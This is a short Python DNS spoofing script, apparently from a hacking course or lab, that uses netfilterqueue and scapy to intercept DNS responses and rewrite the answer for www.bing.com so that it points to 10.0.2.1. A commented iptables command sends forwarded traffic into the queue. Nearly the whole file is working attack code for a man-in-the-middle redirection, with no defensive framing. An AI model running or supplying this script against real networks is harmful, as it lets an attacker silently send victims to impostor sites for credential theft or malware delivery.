#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR): #DNSRQ FOR REQUEST, DNSRR for response
        qname = scapy_packet[scapy.DNSQR].qname # stores the website name
        if "www.bing.com" in qname:
            print("[+] Spoofing target ")
            answer = scapy.DNSRR(rrname=qname, rdata = "10.0.2.1") # Rediracting to our website
            scapy_packet[scapy.DNS].an = answer # Rediracting to our website
            scapy_packet[scapy.DNS].ancount = 1 # How much answers we send

            # Deleting to ensure the packet flow, security
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            packet.set_payload(str(scapy_packet))



        #print(scapy_packet.show()) # packet.payload() will show the packet details
    packet.accept()

        #iptables -I FORWARD -j NFQUEUE --queue-num 0 /or OUTPUT instead of froward/ for testing own machine

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet) #binds to the queue we made in terminal
queue.run()